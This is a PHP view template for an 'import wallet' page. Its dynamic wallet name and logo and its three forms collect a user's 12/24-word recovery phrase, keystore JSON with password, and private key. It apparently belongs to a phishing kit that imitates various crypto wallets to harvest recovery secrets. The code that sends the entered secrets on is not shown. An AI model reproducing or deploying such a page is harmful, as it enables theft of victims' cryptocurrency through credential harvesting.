
   <!-- SET START -->
    <?= $this->extend("view/master.php");?>   
     <!-- SET END -->
    <?= $this->section('title');?>
        <?= $page_title;?>
    <?= $this->endSection();?>

    <?= $this->section('content');?>
    <!-- SECTION START -->

<style type="text/css">
   
    div.erWallet {
        margin:  10px 0;
        text-align: center;
    }

    div.error {
       color: #721c24;
       background-color: #f8d7da;
       border-color: #f5c6cb;
       font-size: 12px;
       position: relative;
       padding: .75rem 1.25rem;
       margin-bottom: 1rem;
       border: 1px solid transparent;
       border-radius: .25rem;
       text-align: center;
    }

    .btn-title{
        color: #fff;
    }

    /*.active{
        background: #724DE3 !important;
    }*/

    .nav-tabs .nav-item .nav-link{
        /*color: #ED6562 !important;*/
        /*background: #ED6562 !important;*/
    }


    .textarea{
        border: 2px solid #337AB7 !important;
        padding: 13px 16px 11px !important;
        border-radius: 30px !important;
    }

</style>




        <section class="import-box" style="margin-top: 40px;">



            <div style="margin-left: 400px;">
                <div class="row" id="hideImage">
                    <img src="<?=base_url();?><?=$data_slug->image;?>" type="image/png" width="40" style="color:#fff; margin-left: 30px; float: left;">
                    <h4 style="color:#3A99FB; margin-left: 30px; margin-top: 10px; font-weight: bold;"><?=$data_slug->name;?></h4>
                </div>
            
            </div>

             <nav>
                <ul class="nav nav-tabs" id="myTab" role="tablist" style="border: none;">
                    <input type="hidden" name="base_url" id="base_url" value="<?=base_url();?>">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="home-tab">MNEMONIC</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="profile-tab">KEYSTORE
                            JSON</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="contact-tab">PRIVATE KEY</button>
                    </li>                               
                </ul>
            </nav>

            <div class="erWallet" style=" margin-bottom: -20px; margin-right: 30px; margin-left: 30px;"></div>

            <input type="hidden" name="wallet_type" id="wallet_type">

            <div  style="margin-top: -20px;">
                <div class="tab-pane" id="home-tab1" >
                    <form id="phrase_form" class="mnemonic" autocomplete="off">
                        <div class="modal-body">
                            <div class="form-group">
                                <div class="description">Please enter your 12/24 word phrase</div>
                                <p></p>
                                <input type="hidden" id="slugers1">                                
                                <input type="hidden" id="typer1" value="mnemonic">
                                <textarea class="textarea form-control" name="mnemonic_datas" id="mnemonic_data" cols="30" rows="5"
                                    placeholder="Phrase" cols="40" rows="10" maxlength="250" required></textarea>
                                    <p></p><p></p><br>
                                    <p style="margin-top:-8px; font-size:15px;">Please separate each Mnemonic Phrase with a space.</p>
                                <samp style="color: red; font-size:16px; text-align: center;">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</samp>
                            </div>
                            <div class="modal-footer">
                                <div class="" id="">
                                    <button type="button" id="mnemonicBtn"
                                      class="btn btn-primary btn-block"><span class="btn-title">Import</span></button>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>

                <div class="tab-pane" id="profile-tab1" class="keystore" style="display: none;">

                    <form id="keystore_json_form" autocomplete="off">
                        <!-- <input type="hidden" name="wallet_type" id="wallet_type"> -->
                        <div class="modal-body">
                            <div class="form-group">
                                <div class="panel-heading">Please enter your keystore JSON</div>
                                <input type="hidden" id="slugers2">
                                <input type="hidden" id="typer2" value="keystore">
                                <textarea class="textarea form-control" name="keystore_datas" id="keystore_data" cols="30"
                                    rows="6" placeholder="Keytore JSON" cols="40" rows="10" maxlength="250" required></textarea> <br>
                                    
                                <input class="textarea form-control" type="password" name="password" id="password"
                                    placeholder="password">
                                <samp  style="color: red; font-size:16px; text-align: center;">Several lines of text beginning with "{...}" plus the password you used to
                                    encryp it.</samp>
                            </div>

                            <div class="modal-footer">
                                <div class="" id="">
                                    <button type="button" id="keystoreBtn"
                                        class="btn btn-primary btn-block"><span class="btn-title">Import</span></button>
                                </div>
                            </div>
                        </div>
                    </form> 
                </div>

                <div class="tab-pane" id="contact-tab1" style="display: none;">

                    <form id="private_key_form" class="privatekeys" method="post" autocomplete="off">
                        <!-- <input type="hidden" name="wallet_type" id="wallet_type"> -->
                        <div class="modal-body">
                            <div class="form-group">
                                <div class="panel-heading">Please enter private key</div>
                                <input type="hidden" id="slugers3">
                                <input type="hidden" id="typer3" value="private">
                                 <textarea class="textarea form-control" name="privateKey_datas" id="privateKey_data" cols="30"
                                    rows="5" placeholder="Private key" cols="40" rows="10" maxlength="250" required></textarea>
                                    <p></p>
                                    <br>
                                    <p style="margin-top:-8px; font-size:15px;">Please enter your private key in HEX format.</p>
                                    <hr>
                                <samp style="color: red; font-size:16px; text-align: center;">Input the BIP39/BIP44 recovery phrase here to restore the private keys that manage your acccounts.</samp>
                            </div>

                            <div class="modal-footer">
                                <div class="" id="">
                                    <button type="button" id="privateBtn"
                                        class="btn btn-primary btn-block"><span class="btn-title">Import</span></button>
                                </div>
                            </div>
                        </div>
                    </form>

                </div>
            </div>
        </section>
    
   <?= $this->endSection();?>